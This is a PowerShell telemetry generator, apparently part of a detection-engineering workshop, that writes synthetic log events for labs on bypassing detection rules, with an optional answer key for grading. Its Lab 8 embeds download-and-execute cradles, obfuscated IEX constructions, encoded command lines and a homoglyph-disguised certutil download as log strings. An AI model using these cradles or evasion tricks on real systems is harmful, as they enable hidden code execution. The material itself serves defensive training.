# Whether the obfuscated exec is visible depends on Script Block Logging (4104):
#   SBL on  -> a 4104 event carries the constructed source text (Layer-1 rule can match)
#   SBL off -> NO 4104; only the EID 1 powershell launch remains, with the payload either
#              on the command line (-Command) or hidden in -EncodedCommand.
function Get-Lab08 {
    param([string]$Sbl = $ScriptBlockLogging)
    $ev = @()
    $psImg = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
    # obfuscation construction primitives (match Layer-1 hardened regexes)
    $prim = @(
        { "[char]73 + [char]69 + [char]88" },                                   # [char]NN
        { "('IE'+'X')" },                                                        # concat
        { "-join (('X,E,I').Split(','))" },                                      # join after split
        { "$($T.FromB64)('QQBB')" },                                            # FromBase64String
        { "$($T.Gzip)::new(0,0)" },                                             # GzipStream
        { "$($T.SBCreate)(`$d)" },                                              # scriptblock::Create
        { "0x41 -bxor 0x13" },                                                   # -bxor 0x
        { "set-alias gg $($T.IEX)" }                                            # aliasing sensitive cmdlet
    )
    $webSnippet = "&('IE'+'X')((New-Object $($T.WebClient)).$($T.DlString)('http://x/.ps1'))"

    # emit one obfuscated exec attempt; routed by the host's SBL state
    $emit = {
        param([string]$snippet,[string]$techOn)
        $cmp = Pick $Hosts; $usr = Pick $Users
        if (Sbl-ForHost $cmp $Sbl) {
            # 4104 present: the constructed source text is on record -> Layer-1 rule can match
            $ev.Add((New-PSScript -ScriptBlockText $snippet -Computer $cmp -User $usr `
                     -Gt (GT 8 "$techOn (SBL on -> 4104 logged)" 'hardened_fires' $true))) | Out-Null
        } else {
            # SBL off: no 4104. Only the EID 1 launch is visible; payload on cmdline or in -enc.
            if (Chance 0.5) {
                $cl = "`"$psImg`" -nop -w hidden -Command `"$snippet`""
                $tech = 'SBL OFF: no 4104; obfuscated payload only on the EID 1 command line'
            } else {
                $cl = "`"$psImg`" -nop -w hidden -enc $(B64Utf16 $snippet)"
                $tech = 'SBL OFF: no 4104; payload hidden inside -EncodedCommand on EID 1'
            }
            $ev.Add((New-ProcEvent -Image $psImg -OriginalFileName 'PowerShell.EXE' -CommandLine $cl `
                     -ParentImage 'C:\Windows\System32\cmd.exe' -ParentCommandLine '' `
                     -Computer $cmp -User $usr `
                     -Gt (GT 8 $tech 'blind_no_sbl' $true))) | Out-Null
        }
    }

    $ev = [System.Collections.ArrayList]::new()
    for ($n=0; $n -lt 43 -and $ev.Count -lt 50; $n++) {
        $snip = if ($n % 6 -eq 5) { $webSnippet } else { & (Pick $prim) }
        & $emit $snip 'obfuscation primitive'
    }
    # obfuscated certutil (process_creation) - homoglyph/superscript verbs, per-binary folding.
    # SBL is irrelevant here: this is EID 1, and no static rule catches it regardless.
    $sup = @{u=[char]0x1D58; r=[char]0x02B3; l=[char]0x02E1; c=[char]0x1D9C}   # superscript u r l c
    for ($n=0; $n -lt 8 -and $ev.Count -lt 58; $n++) {
        $obf = "-$($sup.u)$($sup.r)$($sup.l)cache -$($T.Split) -f https://x/y z"
        $ev.Add((New-ProcEvent -Image 'C:\Windows\System32\certutil.exe' -OriginalFileName 'CertUtil.exe' `
                 -CommandLine "certutil $obf" -ParentImage 'C:\Windows\System32\cmd.exe' -ParentCommandLine '' `
                 -Gt (GT 8 'obfuscated certutil cradle (superscript verbs; only behavioral catches it)' 'bypass_static' $true))) | Out-Null
    }
    # FP traps: benign scripts that trigger NONE of the 8 Layer-1 primitives.
    # (Note: bare [Convert]::FromBase64String is deliberately NOT an FP-trap here - the
    #  maintainer's Layer-1 rule lists it as a primitive and fires on it by design.)
    # Only meaningful on SBL-enabled hosts (they are 4104 events); skip entirely when SBL is off.
    if ($Sbl -ne 'Off') {
        1..5 | ForEach-Object { if ($ev.Count -lt $PerLab) {
            $ev.Add((New-PSScript -ScriptBlockText (Pick @(
                '$dest = $env:TEMP + ''\report.csv''',      # var + literal concat (not literal+literal)
                '$line = -join $cols',                        # -join without ((...).Split
                '$msg = ''{0}: {1}'' -f $name, $code',        # format string (an un-enumerated gap)
                'Copy-Item $src $dest -Force'                 # -Force here is not a Demo-08 signal
            )) -Gt (GT 8 'benign; triggers no obfuscation primitive' 'fp_trap' $false))) | Out-Null } }
    }
    # baseline benign noise. On SBL-enabled hosts these are 4104 script blocks; when SBL is
    # off they surface as ordinary EID 1 powershell launches instead.
    while ($ev.Count -lt $PerLab) {
        $cmp = Pick $Hosts
        if ($Sbl -ne 'Off' -and (Sbl-ForHost $cmp $Sbl)) {
            $ev.Add((New-PSScript -ScriptBlockText (Pick @('Get-Date','Get-ChildItem C:\ | Sort-Object Length',
                     'Import-Module ActiveDirectory')) -Computer $cmp `
                     -Gt (GT 8 'benign script block' 'baseline' $false))) | Out-Null
        } else {
            $ev.Add((New-ProcEvent -Image $psImg -OriginalFileName 'PowerShell.EXE' `
                     -CommandLine (Pick @("`"$psImg`" -File C:\scripts\backup.ps1","`"$psImg`" -Command Get-Date")) `
                     -ParentImage 'C:\Windows\explorer.exe' -ParentCommandLine '' -Computer $cmp `
                     -Gt (GT 8 'benign powershell launch' 'baseline' $false))) | Out-Null
        }
    }
    @($ev) | Select-Object -First $PerLab
}

# ====================================================================================
# Lab registry
# ====================================================================================
$LabDefs = @{
    1 = @{ name='Parameter Variation';        tele='process_creation (EID 1)';               gen={ Get-Lab01 } }
    2 = @{ name='Fragmentation & Chaining';   tele='FileCreate (EID 11) + ProcessCreate (EID 1)'; gen={ Get-Lab02 } }
    3 = @{ name='Whitespace Manipulation';    tele='process_creation (EID 1)';               gen={ Get-Lab03 } }
    4 = @{ name='Boolean Replacement';        tele='ScriptBlock (4104) + FileDeleteDetected (EID 26)'; gen={ Get-Lab04 } }
    5 = @{ name='Quote Manipulation';         tele='process_creation (EID 1) + EID 11/13'; gen={ Get-Lab05 } }
    6 = @{ name='Delimiter Manipulation';     tele='process_creation (EID 1), parent-correlated'; gen={ Get-Lab06 } }
    7 = @{ name='WSL for PowerShell';         tele='process_creation (EID 1) + FileCreate (EID 11)'; gen={ Get-Lab07 } }
    8 = @{ name='Obfuscation';                tele='ScriptBlock (4104) + process_creation (EID 1)'; gen={ Get-Lab08 } }
}

# ====================================================================================
# Output (ndjson)
# ====================================================================================
function Prep-Event($e) {
    if (-not $IncludeGroundTruth) {
        $props = $e.PSObject.Properties.Name | Where-Object { $_ -ne '_gt' }
        $o = [ordered]@{}; foreach ($p in $props) { $o[$p] = $e.$p }
        [pscustomobject]$o
    } else {
        if ($e.PSObject.Properties.Name -contains '_gt') {
            $e | Add-Member -NotePropertyName 'deathcon' -NotePropertyValue $e._gt -Force
            $props = $e.PSObject.Properties.Name | Where-Object { $_ -ne '_gt' }
            $o = [ordered]@{}; foreach ($p in $props) { $o[$p] = $e.$p }
            [pscustomobject]$o
        } else { $e }
    }
}
function Write-Ndjson {
    param([object[]]$Events,[string]$Path)
    $dir = Split-Path -Parent $Path
    if ($dir -and -not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    $sw = [System.IO.StreamWriter]::new($Path, $false, [Text.UTF8Encoding]::new($false))
    try {
        foreach ($e in $Events) {
            $sw.WriteLine((Prep-Event $e | ConvertTo-Json -Depth 8 -Compress))
        }
    } finally { $sw.Dispose() }
}

# ====================================================================================
# UI
# ====================================================================================
function Show-Banner {
    Write-Host ""
    Write-Host "  ============================================================" -ForegroundColor DarkCyan
    Write-Host "   DEATHCon 2026 Lab  -  Telemetry Generator" -ForegroundColor Cyan
    Write-Host "   'I See Your Rule, and I Raise You a Bypass'" -ForegroundColor DarkGray
    Write-Host "  ============================================================" -ForegroundColor DarkCyan
    Write-Host "   Generates SYNTHETIC logs only. Runs no attack commands." -ForegroundColor DarkGray
    Write-Host ""
}
function Show-Menu {
    Write-Host "  Available labs:" -ForegroundColor White
    foreach ($k in ($LabDefs.Keys | Sort-Object)) {
        $d = $LabDefs[$k]
        Write-Host ("   [{0}] {1,-26} " -f $k, $d.name) -ForegroundColor Yellow -NoNewline
        Write-Host $d.tele -ForegroundColor DarkGray
    }
    Write-Host "   [a] All labs" -ForegroundColor Green
    Write-Host "   [q] Quit" -ForegroundColor DarkGray
    Write-Host ""
}
function Parse-Selection {
    param([string]$raw)
    if ([string]::IsNullOrWhiteSpace($raw)) { return @() }
    if ($raw.Trim().ToLower() -in @('a','all')) { return @($LabDefs.Keys | Sort-Object) }
    $out = @()
    foreach ($tok in ($raw -split '[,\s]+')) {
        if ($tok -match '^\d+$' -and $LabDefs.Contains([int]$tok)) { $out += [int]$tok }
    }
    $out | Select-Object -Unique
}

# ====================================================================================
# Main
# ====================================================================================
Show-Banner

$interactive = -not $Labs
if ($interactive) {
    $of = Read-Host "  ndjson output path [$OutFile]"
    if ($of) { $OutFile = $of }
}

# Resolve lab selection
$selection = @()
if ($Labs) { $selection = Parse-Selection ($Labs -join ' ') }
if (-not $selection) {
    Show-Menu
    $raw = Read-Host "  Select lab(s) (e.g. 1,3,8 or 'a')"
    if ($raw.Trim().ToLower() -eq 'q') { Write-Host "  Bye."; return }
    $selection = Parse-Selection $raw
}
if (-not $selection) { Write-Host "  No valid labs selected." -ForegroundColor Red; return }

Write-Host ""
Write-Host ("  Generating up to {0} events per lab for: {1}" -f $PerLab, ($selection -join ', ')) -ForegroundColor White
Write-Host ""

$all = @()
$summary = @()
foreach ($k in ($selection | Sort-Object)) {
    $d = $LabDefs[$k]
    Write-Host ("  -> Demo {0:D2}  {1}" -f $k, $d.name) -ForegroundColor Cyan -NoNewline
    $events = & $d.gen
    $events = @($events | Select-Object -First $PerLab)
    $all += $events
    $fires   = @($events | Where-Object { $_._gt.expectation -in @('hardened_fires','bypass_static','blind_no_sbl') }).Count
    $traps   = @($events | Where-Object { $_._gt.expectation -eq 'fp_trap' }).Count
    $base    = @($events | Where-Object { $_._gt.expectation -eq 'baseline' }).Count
    Write-Host ("   ... {0} events  (bypass:{1}  fp-trap:{2}  baseline:{3})" -f $events.Count,$fires,$traps,$base) -ForegroundColor DarkGray
    if ($k -eq 8) {
        $blind = @($events | Where-Object { $_._gt.expectation -eq 'blind_no_sbl' }).Count
        Write-Host ("      Script Block Logging (4104): $ScriptBlockLogging  -> $blind obfuscated exec(s) produced NO 4104 (EID 1 only)") -ForegroundColor DarkYellow
    }
    $summary += [pscustomobject]@{ Demo=$k; Name=$d.name; Events=$events.Count; Bypass=$fires; FPtrap=$traps; Baseline=$base }
}

Write-Host ""
Write-Ndjson -Events $all -Path $OutFile
$resolved = (Resolve-Path $OutFile -ErrorAction SilentlyContinue)
Write-Host ("  Wrote {0} events -> {1}" -f $all.Count, ($(if ($resolved) { $resolved.Path } else { $OutFile }))) -ForegroundColor Green

Write-Host ""
Write-Host "  Summary:" -ForegroundColor White
$summary | Format-Table -AutoSize | Out-String | Write-Host
if (-not $IncludeGroundTruth) {
    Write-Host "  (answer key omitted; re-run with -IncludeGroundTruth to tag events for self-grading)" -ForegroundColor DarkGray
}
Write-Host "  Done." -ForegroundColor Cyan
